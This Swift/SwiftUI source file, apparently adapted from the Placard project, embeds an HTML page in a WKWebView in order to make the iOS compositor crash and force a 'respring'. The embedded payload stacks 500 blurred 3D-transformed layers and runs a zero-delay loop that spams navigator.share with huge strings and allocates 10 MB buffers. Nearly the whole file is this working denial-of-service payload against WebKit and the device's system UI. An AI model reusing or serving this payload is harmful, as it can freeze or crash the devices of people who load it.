import SwiftUI
import WebKit

// Adapted from frs0n/placard, revision 7f470dd0242f9d69ea5ad17e521566487706c891.
// GPL-3.0; see LICENSES/Placard-NOTICE.md and Placard-GPL-3.0.txt.
// Mechanism credit: rooootdev, skadz108, neonmodder123; studied in Placard.
// This is a disruptive WebKit/compositor stress attempt, NOT registration IPC.
struct MirsaWallpaperRespringView: UIViewRepresentable {
    let event: (String) -> Void

    func makeCoordinator() -> Coordinator { Coordinator(event: event) }
    func makeUIView(context: Context) -> WKWebView {
        let options = WKWebViewConfiguration()
        options.websiteDataStore = .nonPersistent()
        options.defaultWebpagePreferences.allowsContentJavaScript = true
        let view = WKWebView(frame: .zero, configuration: options)
        view.navigationDelegate = context.coordinator
        view.isOpaque = true
        view.backgroundColor = .black
        view.scrollView.backgroundColor = .black
        view.scrollView.isScrollEnabled = false
        event("REFRESH BEFORE WebKit load · local iframe/compositor stress requested; not proof of respring")
        view.loadHTMLString(Self.document, baseURL: nil)
        return view
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    static func dismantleUIView(_ uiView: WKWebView, coordinator: Coordinator) {
        uiView.stopLoading()
        uiView.loadHTMLString("<html><head><meta charset=\"utf-8\"></head><body></body></html>", baseURL: nil)
        coordinator.event("REFRESH AFTER view dismantled · local page cleared; system respring unverified")
    }
    final class Coordinator: NSObject, WKNavigationDelegate {
        let event: (String) -> Void
        init(event: @escaping (String) -> Void) { self.event = event }
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            event("REFRESH AFTER WebKit navigation finished · payload page loaded only; gallery/respring unverified")
        }
        func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
            event("REFRESH AFTER WebKit content process terminated · no automatic reload; system respring unverified")
        }
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
            event("REFRESH AFTER navigation error · " + error.localizedDescription)
        }
        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            event("REFRESH AFTER provisional error · " + error.localizedDescription)
        }
    }
    static let document = #"""
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>html,body,iframe{margin:0;width:100%;height:100%;border:0;background:#000;overflow:hidden}</style>
      </head>
      <body>
        <iframe id="frame" srcdoc="" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts"></iframe>
        <script>
          const frame = document.getElementById('frame');
          const payload = `
            <html><body style="margin:0;background:#000;overflow:hidden"><script>
              const container = document.createElement('div');
              container.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%;';
              document.body.appendChild(container);
              for (let i = 0; i < 500; i++) {
                const layer = document.createElement('div');
                layer.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);';
                container.appendChild(layer);
              }
              setInterval(() => {
                navigator.share({title:'R',text:'R'.repeat(100000)}).catch(() => {});
                const bytes = new Uint8Array(1024 * 1024 * 10);
                crypto.getRandomValues(bytes);
              }, 0);
            <\/script></body></html>`;
          frame.srcdoc = payload;
        </script>
      </body>
    </html>
    """#
}
